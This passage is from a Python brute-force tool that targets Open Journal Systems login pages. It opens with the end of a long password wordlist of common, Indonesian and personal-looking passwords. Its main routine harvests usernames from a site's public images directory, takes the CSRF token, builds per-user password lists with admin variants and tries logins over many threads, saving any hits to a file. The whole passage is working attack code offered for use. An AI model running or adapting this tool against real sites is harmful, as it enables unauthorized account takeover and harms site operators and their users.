"a1s2d3f4", "avonline", "123qwer", "Abc123", "1qaz@wsx", "aaa", "master123", "secret", "xxxxxx", "zabbix", "00000000", "pi", "123qweasdzxc", "senha1", "Admin123", "welc0me", "manager", "passwd123", "1qaz2wsx3edc", "Huawei12#$", "P@$$w0rd", "windows", "A@0599343813A@0599343813A@0599343813", "Qwer1234", "123!@#", "welcome123", "winner", "qwertyui", "qazwsx123", "qwerty123456", "0000", "P@ssword", "qazwsx", "123abc", "a123456", "aaaaaa", "vision", "123456aa", "Password123", "firewall", "asd123", "6uPF5Cofvyjcew9", "system32", "!QAZ@WSX", "P@ssw0rd123", "q1w2e3r4t5y6", "temp", "debian", "baidu.com", "root12", "synopass", "Abcd1234", "azerty", "hlL0mlNAabiR", "@123456", "admin123#", "Root1234", "test1234", "Changeme123", "q1w2e3r4t5", "abc123456", "vagrant", "abc123!", "abc1234", "1qaz@WSX3edc", "newroot", "dragon", "a1b2c3d4", "lenovo", "root01", "asdfghjkl", "vmware", "qwe123456", "123.321", "asd123456", "q1w2e3", "Root@123", "postgres", "qq313994716.", "12345qwert", "asd12345", "Aa123456789", "adminpassword", "iDirect", "Aa123456.", "openelec", "Ll123456", "J5cmmu=Kyf0-br8CsW", "live", "root12345", "123!@#qwe", "asdasd", "blahblah", "123456a", "meiyoumima", "Root123456", "operator", "PassWord", "casa", "qazxsw", "linux123", "tang", "abcd123456", "123qwe123", "root123!@#", "!QAZ1qaz", "aA123456", "!qaz@wsx", "gateway", "daniel", "superman", "data", "centos6svm", "jupiter", "uucp", "qwer123.", "r00t123", "root123456789", "zxc123", "tester", "testtest", "juniper1", "qwe123qwe", "monitor", "CactiEZ", "poiuyt", "temporal", "george", "asdfg", "rootpw", "Aa112233", "hadoop", "Admin123!@#", "sales", "testing", "games", "1234abcd", "qazwsx12", "bling", "caonima", "powerpc", "admin1234567", "nagios", "P@ssw0rd1234", "peter", "4rfv$RFV", "test@123", "manager123", "whoami", "Test1234", "iloveyou", "nimda", "geheim", "toto", "5nWt3P-fF4WosQm5O", "ts3", "!@#$%^", "z1x2c3v4", "apache", "pf123456", "qaz123", "welcome1", "Ab123456", "Password!", "changeme123", "idc123", "qwe", "1qaz3edc", "q", "1qq2w3e4r5t", "root001", "redhat123", "P@ssw0rd1", "Pa$$w0rd", "q123456", "zxcasdqwe123", "Root123", "driver", "Aa@123456", "1qaz1QAZ", "Aa11223344", "dolphin1", "Aa112211", "rahasia123", "root2024", "Aa123456@", "a123456789", "bingo123", "r", "1a2s3d4f", "1z2x3c4v", "1qazse4", "oracle123", "library", "!Q2w3e4r", "Passw0rd1234", "1Q2W3E4R", "abcd@123", "qazwsxedc123", "qqq123", "angel", "rush2112", "server123", "changeme@123", "Welcome@123", "angel123", "rootrootroot", "Abc123456", "india123", "genesis", "masterkey", "service", "abcd123", "teste123", "123456789a", "Aa111111.", "iJ93MnFj4VnWf0sA78gCx", "qwerzxcv", "lalala", "Dinamo79buc", "fuckyou", "zaqxswcde", "zxcv1234", "deploy", "!@#123qwe", "Pr1vat3R00tSh3lL", "1qaz2wsx!@#", "Qq123456", "qwert", "qazxswedc", "senha123", "1234%^&*", "adminroot", "o12nu27", "~!@#$%^&", "pollyO0O!#%&", "1Q2w3e4r", "123qaz", "develop", "openssh!execute", "!@#qwe123", "1234567a", "P@ssword123", "hello123", "1qa2ws3ed", "alpin", "123456abc", "mysql", "Welcome1", "qweqwe", "ftp", "123@123a", "huawei123", "qq123456", "love", "random", "!@#$5678", "rich", "abcdef", "dnflskfk", "p", "test1", "a1b2c3d4e5", "Admin1234", "www", "google", "start123", "stones", "123mudar", "centos7svm", "Asdqwe123", "vyatta", "access", "xiaozhe", "libreelec", "qq123123", "MoeClub.org", "qwer12345", "ftpuser", "p0o9i8u7", "phoenix", "cocacola", "xx", "blackout", "!@#$%^&*()", "asterisk", "patrick", "thomas", "Asd123Asd", "clone", "qweqwe123", "asdfgh", "oracle1", "123456qwerty", "git", "root!@#", "Admin123456", "fuck", "redhat@123", "zaq1@WSX", "danny", "toshiba", "xc3511", "!QAZ2wsx#EDC", "Changeme_123", "shisp.com", "123qweASD", "Huawei123", "danger", "os10+ZTE", "wubao", "test12345", "PlcmSpIp", "65432!", "hwang", "zhang123", "Aa123123.", "abcd@1234", "ABCabc123", "P@ssw0rd@123", "l3tm3in", "asd", "idcidc", "angel23", "passpass", "Admin123!", "teamspeak", "123456Aa", "7hur@y@t3am$#@!(*(", "demo", "testpass", "!@#123", "Server12#$", "router", "aaron", "upload", "aaa123", "root@0101", "emporium", "info", "root321", "Passw0rd1", "t0talc0ntr0l4!", "Password@123", "backup", "puppet", "eclipse", "root!@#$", "aaaaaaaa", "!Q@W3e4r", "Aa12345678", "developer", "ftp123", "mark", "r123456", "cdnadmin", "bluetooth", "root123!", "zxc", "admin!@", "paris", "www-data", "123456q", "administraator", "motorola", "ts", "zxcvbn", "x", "QWEqwe123", "asteriskftp", "ferrari", "1a2b3c", "asdf123", "arris", "tomcat", "2wsx#EDC", "letmein123", "root12345678", "Aa888888", "broadguam1", "Aa111111", "1234.com", "saba7861", "sshd", "Test123", "nobody", "oracle@123", "tester123", "Admin101", "pgj-heu05HQM=bMvz", "r00tme", "alberto", "dev", "qwaszx", "8owmpiyddyo", "articon", "fluffy", "123@qwe", "Pass1234", "Password1234", "qqqqqq", "root123@", "!", "123root", "123456a@", "D-Link", "presto", "qwerty@123", "woofwoof", "qwe123asd", "123.456", "marina", "zxm10", "21vianet", "Password01!", "buffy", "escape", "qQ123456", "mario", "ubuntu20svm", "123asd", "Password01", "goliath", "Abc12345", "!QAZxsw2", "123qweQWE", "juniper", "qweasdzxc123", "zhiyu@123", "vicidial", "123!@#qweQWE", "brandy", "Test@123456", "a@123456", "root@2023", "Aa123456!", "nokia", "Password12", "share", "Aa@123123", "Password123!", "linux@123", "YsoRim2oByGviuPGD670mAr", "root666", "s123456", "Admin@123456", "jackie", "adm", "00000", "computer", "zhang", "!@#$%^&", "Qwerty", "nopassword", "123@.com", "Q1w2e3r4", "david", "qwerty123!", "root2022", "a1234567", "crystal", "poptarts", "secret01", "applepie", "root@1234", "zaqxswcdevfr", "getout", "P@ssw0rd!@#$", "goodluck", "hawk", "123456.cn", "swordfish", "q1q2q3q4", "chicken", "1qaz2wsx!QAZ@WSX", "admin88", "mestre", "server123456", "!@#123456", "a12345678", "Root@1234", "postgres123", "qwerty1234", "lennon", "wombat", "zaq123", "shangdi", "porsche", "qwer1234!@#$", "root@123456", "thinkgreen", "valeria", "1234567!@#$%^&", "andrew", "ncc-1701", "c8h10n4o2", "martin", "123456!@#$%^", "123@123", "1qaz@WSX3edc$RFV", "A123456a", "f976efb7524d473e67fff619f7600811", "0p9o8i7u", "qwe123123", "applemac", "caonimabi", "k123456", "qweasd123", "test!@#", "jerry", "rahasia", "rock", "aa123123", "chinatt10050", "123qwe!@#QWE", "1qazXSW@3edc", "1234Qwer", "@n!md@mP#$@?$&#@!#mTadm!n$@", "admin!@#", "admin@2013", "hello", "www.baidu.com", "Pass@123", "abc@1234", "manager1", "abc12345", "hucgynxz!&#IT", "jack", "QWERTY123", "demo123", "domain", "mike", "a123456.", "docker", "openssh-portable-com", "root1337", "sniper", "student", "triton", "Abcd@1234", "abc", "admin123$%^", "mohammad", "raspi", "sql", "!QAZ3edc", "Aa@112211", "abc.123", "ciao", "root2014", "xiaolin82", "PASSWORD", "password0000", "destiny", "jiamima", "qwerasdf", "rkqldk", "Aa@11223344", "QWE123qwe", "Root2022", "a123456A", "bananas", "internet", "m", "qwert12345", "super123", "Qwerty123", "admin12342234", "nihao123!", "root!123", "training", "kevin", "qwer@1234", "ABC123abc", "Admin@12345", "Huawei123!", "generic", "miranda", "ans#150", "zzzzzz", "Abc@123456", "Asd123456", "centos8svm", "david123", "qaz123456", "nemesis", "123QWEasd", "Password@1", "aa11223344", "open123", "asshole", "2wsx@WSX", "smoker666", "aB123456", "1a2b3c4d", "1qazxdr5", "Qazwsx123", "no1knows", "qqq111", "yyyyyy", "A123456.", "office", "sistemas", "123qwerty", "PASS", "Root1234!", "a123123", "alpha", "pwlamea123", "qwer123456", "azertyuiop", "helloworld", "AA123456", "gsxr600", "roota", "support.26", "Admin@9000", "ZAQ!2wsx", "admin!@#$%^&", "okokok", "santos", "zxc123456", "123456.com", "Abc123456789", "cloudmind.cn", "pulamea123", "1qaz#EDC", "Qwe123456", "com", "contact", "root99", "siemens", "123Qwerty", "jasper", "Aa147258", "P@ss1234", "Qwerty1", "TANDBERG", "mylinux", "openvpnas", "temp123", "1qaz2WSX", "Admin@1234", "huahua123", "chaos", "r00tr00t", "Qwer123456", "qwerty12345", "1qaz@2wsx", "A123456", "valentine", "whathefuck", "bismillah", "calvin1", "sembarang", "01234567", "1qaz", "cpe1704tks", "1qaz1qaz", "Ubuntu123", "mings$%^&", "tiffany", "!QAZ@WSX3edc", "Qwer1234.", "Welcome123", "drcom123", "s", "test123456", "Aa1234567", "a123456!", "caca", "qaz123!@#", "!q@w", "7ujMko0admin", "idc!@", "lol123", "123456qq", "apple76", "idcez123", "matrix", "4r3e2w1q", "Qwe123123", "lanyue", "megan10", "98765!", "abcd.1234", "password1111", "ramesh123", "rootpasswd", ",.", "000", "chang3m3", "google.com", "P@ssw0rd123!", "n0t4u2c", "nokia6630", "ss12345", "Asdf13579#", "!QAZ2wsx3edc", "casamia", "f", "francis", "roottoor", "!2#4%6&", "1admin@123", "1qaz2wsx#EDC", "abc123.", "dupadupa", "pancake", "powder1", "radio7", "webuser", "!admin@123", "Hello@123", "abc-123", "rootpassword", "123456qwe", "!QAZxsw2#EDC", "_", "chaitanya", "connect", "jenkins", "radmin", "vivek@123", "web", "abc123..", "elmismo", "firewire", "q!w@e#r$t%y^u&", "1Q2w3e4r5t", "Aa12345", "dietpi", "newpass1", "route66", "123456aA", "3edc#EDC", "Admin12345", "asdasd123", "australia", "please", "root@12345", "sa", "webmaster", "1q2a3z", "Qweasd123", "abcd", "baidu123", "root@root", "abc123@", "aa12345678", "monkey", "qwerty1", "myspace1", "football", "princess", "sunshine", "michael", "shadow", "killer", "12345a", "ashley", "target123", "baseball", "soccer", "charlie", "tinkle", "jessica", "1g2w3e4r", "gwerty123", "zag12wsx", "gwerty", "jordan", "pokemon", "liverpool", "iloveyou1", "michelle", "a12345", "Status", "fuckyou1", "hunter", "princess1", "naruto", "justin", "jennifer", "qwerty12", "anthony", "andrea", "joshua", "love123", "robert", "nicole", "football1", "freedom", "michael1", "chocolate", "12345q", "starwars", "mynoob", "qwertyu", "lovely", "monkey1", "nikita", "pakistan", "jordan23", "123456789q", "forever", "xxx", "indonesia", "sayang", "cantik", "maho123", "jakarta", "ganteng", "bintang", "kucing", "sayangku", "muhammad", "anjing", "doraemon", "bandung", "cintaku", "terserah", "desember", "kontol", "sukses", "bajingan", "juventus", "surabaya", "matahari", "september", "semangat", "sayangkamu", "katasandi", "mamapapa", "november", "1v7Upjw3nT", "januari", "bangsat", "nabila", "mautauaja", "barcelona", "agustus", "bianca", "komputer", "erika", "semarang", "sakura", "sagitarius", "bismilah", "jancok", "sasuke", "palembang", "hahaha", "aylin", "omarbelmestour", "juannaja", "kallynlavallee", "olivia", "auliamoza", "shykitty", "laila", "fatih", "stripes", "gracep", "aremania", "kaveh", "kathleen", "dayse", "salmantheone", "santhu", "joesasaki", "laurenmara1", "oktober", "camcam", "cellysilva", "tevonl", "ahmedsplumb", "shalsanur", "addyissimp", "pabloparraito", "brandoncalix", "jentingap", "sahabat", "rahasia1", "saifullyzan", "corafields", "maripelos", "bobbi", "aldenora", "sampoerna", "123rf", "aditya", "sachin", "maricielo", "secure", "aisyah", "vinninaicker", "maria1", "clayburnclark", "shekinah", "syarasyifa", "stasya", "akusayangkamu", "alaiza", "sarfin", "cherbill", "gaby1", "belen", "jansaia", "alifa", "rafirna", "vanessad", "akberbilal", "a1b2c3", "cinta", "12345abcde", "bgt5nhy6", "antok", "gabinphilippeau", "ieman", "shaurya", "Finn1234", "nicole15", "jacobo", "Squash1234", "sasazana", "arenasjazmin", "liani", "noramira", "shyannmiles", "lauana", "disdus", "jays4days", "s1ngle", "sheltonmclaren", "Sidsashy1", "denpasar", "batu", "bekasi", "blitar", "bogor", "cianjur", "cilegon", "cimahi", "cirebon", "depok", "madiun", "magelang", "malang", "mojokerto", "pasuruan", "pekalongan", "probolinggo", "salatiga", "south tangerang", "sukabumi", "surakarta", "tasikmalaya", "tangerang", "tegal", "yogyakarta", "kediri", "serang", "purwokerto", "balikpapan", "banjarmasin", "bontang", "palangkaraya", "pontianak", "samarinda", "singkawang", "tarakan", "tenggarong", "ambon", "tual", "ternate", "tidore", "bima", "mataram", "kupang", "atambua", "jayapura", "merauke", "kota sorong", "monokwari", "bau-bau", "bitung", "gorontalo", "kendari", "makasar", "manado", "palu", "pare-pare", "palopo", "tomohon", "banda aceh", "bandar lampung", "batam", "bengkulu", "blangkejeren", "binjai", "bireuen", "bukittinggi", "dumai", "jambi", "langsa", "lhokseumawe", "lubuklinggau", "meulaboh", "medan", "metro", "padang", "padang panjang", "padang sidempuan", "pagar alam", "pangkal pinang", "pariaman", "payakumbuh", "pekanbaru", "pematang siantar", "prabumulih", "sigli", "redelong", "sabang", "sawah lunto", "sibolga", "singkil", "solok", "takengon", "tapaktuan", "tanjung balai", "tanjung pinang", "tebing tinggi"
    ]
    return indonesian_passwords

def main():
    print_banner()
    login_url = input("Target Login (eg: https://ojs.target.com/index.php/index/login): ")
    base_url = extract_base_url(login_url)
    images_url = f"{base_url}/public/site/images"
    
    print(f"Using Public Site Images URL: {images_url}")

    print(f"{Colors.GRAY}Extracting usernames from directory...{Colors.RESET}")
    usernames = extract_usernames(images_url)
    if not usernames:
        print(f"{Colors.GRAY}No usernames found from directory listing.{Colors.RESET}")
        manual_input = input(f"{Colors.YELLOW}Enter usernames manually (eg: admin|adminojs|adminjurnal): {Colors.RESET}")
        if not manual_input.strip():
            print(f"{Colors.GRAY}No usernames provided. Exiting.{Colors.RESET}")
            return
        usernames = [u.strip() for u in manual_input.split('|') if u.strip()]
        if not usernames:
            print(f"{Colors.GRAY}No valid usernames provided. Exiting.{Colors.RESET}")
            return

    usernames = prioritize_admin_usernames(usernames)
    
    print(f"{Colors.GREEN}Found {len(usernames)} valid usernames{Colors.RESET}")
    
    print(f"{Colors.GRAY}Available usernames:{Colors.RESET}")
    for i, username in enumerate(usernames, 1):
        print(f"  {username}")
    print()

    selected_input = input(f"{Colors.YELLOW}Select usernames to test (comma-separated, leave blank for all): {Colors.RESET}")
    
    if not selected_input.strip():
        selected_usernames = usernames
    else:
        selected_usernames = [u.strip() for u in selected_input.split(',') if u.strip()]

    if not selected_usernames:
        print(f"{Colors.RED}No valid usernames selected.{Colors.RESET}")
        return

    print(f"{Colors.GRAY}Retrieving CSRF token and action URL...{Colors.RESET}")
    action_url, csrf_token = get_csrf_token_and_action(login_url)
    if not action_url:
        print(f"{Colors.RED}Failed to get action URL.{Colors.RESET}")
        return

    try:
        threads = int(input(f"{Colors.YELLOW}Enter number of threads (default 10): {Colors.RESET}") or "10")
        if threads <= 0:
            threads = 10
    except ValueError:
        threads = 10

    print(f"{Colors.YELLOW}Starting brute force with {threads} threads...{Colors.RESET}")
    
    results = []
    lock = threading.Lock()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_username = {}
        for username in selected_usernames:
            always_generate_list = generate_always_generate_list(login_url)
            
            user_passwords = []
            user_passwords.append(username)
            indonesian_passwords = generate_indonesian_passwords()
            user_passwords.extend(indonesian_passwords)
            
            admin_like_keywords = ["admin", "mimin", "atmin", "min", "ojs", "jurnal", "journal"]
            is_admin_like = any(keyword in username.lower() for keyword in admin_like_keywords)
            
            if is_admin_like:
                base_passwords = ["admin", "admin123", "admin1234", "admin12345", "admin123456", "password", "123456", "12345678"]
                admin_variants = []
                for keyword in admin_like_keywords:
                    if keyword in username.lower():
                        admin_variants.extend([f"{keyword}123", f"{keyword}1234", f"{keyword}12345", f"{keyword}123456"])
                user_passwords.extend(list(set(base_passwords + admin_variants)))
            else:
                user_passwords.extend(generate_custom_wordlist([username], always_generate_list))
            
            common_passwords = ["123456", "password", "12345678", "qwerty", "123456789", "admin", "admin123"]
            user_passwords.extend(common_passwords)
            
            seen = set()
            unique_passwords = []
            for pwd in user_passwords:
                if pwd not in seen:
                    seen.add(pwd)
                    unique_passwords.append(pwd)
            
            user_passwords = unique_passwords
            
            future = executor.submit(brute_force_worker, username, user_passwords, action_url, csrf_token, results, lock, login_url)
            future_to_username[future] = username
        
        for future in as_completed(future_to_username):
            username = future_to_username[future]
            try:
                result = future.result()
                if result:
                    print(f"{Colors.GREEN}[{username}] Brute force completed successfully!{Colors.RESET}")
                    continue_brute = input_with_timeout(f"{Colors.YELLOW}Do you want to continue with another username? (y/n): {Colors.RESET}", 10)
                    if continue_brute is None:
                        print(f"{Colors.YELLOW}Continuing with next username due to timeout...{Colors.RESET}")
                        continue
                    elif continue_brute.lower() != 'y':
                        break
            except Exception as e:
                print(f"{Colors.RED}[{username}] Thread error: {e}{Colors.RESET}")

    if results:
        print(f"\n{Colors.GREEN}=== BRUTE FORCE RESULTS ==={Colors.RESET}")
        for username, password, login_url in results:
            print(f"{Colors.GREEN}SUCCESS: Username: {username} | Password: {password}{Colors.RESET}")
        print(f"\n{Colors.GREEN}Successful logins saved to 'ojs_ok.txt'{Colors.RESET}")
        print(f"{Colors.GREEN}Login URL: {login_url}{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}No successful logins found.{Colors.RESET}")

if __name__ == "__main__":
    main()
